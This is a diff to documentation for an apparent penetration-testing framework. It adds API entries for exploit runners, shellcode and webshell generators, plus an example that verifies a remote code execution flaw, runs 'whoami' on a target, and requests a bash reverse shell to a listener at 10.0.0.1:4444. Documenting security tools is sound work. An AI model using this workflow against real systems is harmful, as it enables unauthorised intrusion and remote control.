@@ -33,11 +33,15 @@ Search engines, port scanning, service grabbing, DNS resolution, and subdomain e
 
 ### :material-bug: Exploitation
 
-Binary analysis, payload building, process execution, and network utilities.
+Exploit connectors, shellcode generation, webshells, and payload delivery.
 
 | API | Purpose | Example |
 |-----|---------|---------|
+| **ExploitRunner** | Load and execute exploit connectors | `runner.run_exploit('rce', target, mode)` |
+| **ExploitBase** | Base class for exploit development | `class MyExploit(ExploitBase): ...` |
 | **ShellcodeGenerator** | Platform-specific shellcode | `gen.generate('linux', 'x64')` |
+| **WebShell** | Web shell generation | `shell.generate('php')` |
+| **HTTPClient** | Advanced HTTP operations | `client.request(url, method='POST')` |
 <!--
 | **RemoteTarget** | Socket connections | `with RemoteTarget(host, port) as r:` |
 | **BinaryAnalyzer** | Security property analysis | `analyzer.check_pie()` |
@@ -81,21 +85,46 @@ targets = fofa.search('app="Apache" && country="US"', pages=2)
 ### Exploitation Example
 
 ```python
-from ofx.api import shellcode
+from ofx.api.exploit import ExploitRunner, ExploitMode
 
-# Build payload
-sc_gen = shellcode.ShellGenerator('linux', 'x64')
-payload, _ = sc_gen.get_shellcode(
-    shellcode_type='reverse',
-    connectback_ip='10.0.0.1',
-    connectback_port=4444
+# Initialize exploit runner
+runner = ExploitRunner()
+
+# List available exploits
+exploits = runner.list_exploits()
+print(f"Available exploits: {exploits}")
+
+# Verify vulnerability
+result = runner.run_exploit(
+    connector="example_rce",
+    target="http://target.com:8080",
+    mode=ExploitMode.VERIFY
 )
 
-# RemoteTarget is commented out as it is not in the provided context.
-# # Send to target
-# with RemoteTarget(host='target.com', port=9999) as remote:
-#     remote.send(payload)
-#     response = remote.recv()
+if result.success:
+    print("Target is vulnerable!")
+    
+    # Execute attack
+    attack_result = runner.run_exploit(
+        connector="example_rce",
+        target="http://target.com:8080",
+        mode=ExploitMode.ATTACK,
+        options={"command": "whoami"}
+    )
+    
+    print(f"Command output: {attack_result.output}")
+    
+    # Get reverse shell
+    shell_result = runner.run_exploit(
+        connector="example_rce",
+        target="http://target.com:8080",
+        mode=ExploitMode.SHELL,
+        options={
+            "lhost": "10.0.0.1",
+            "lport": "4444",
+            "shell_type": "bash"
+        }
+    )
 ```
 
 ### Post-Exploitation Example
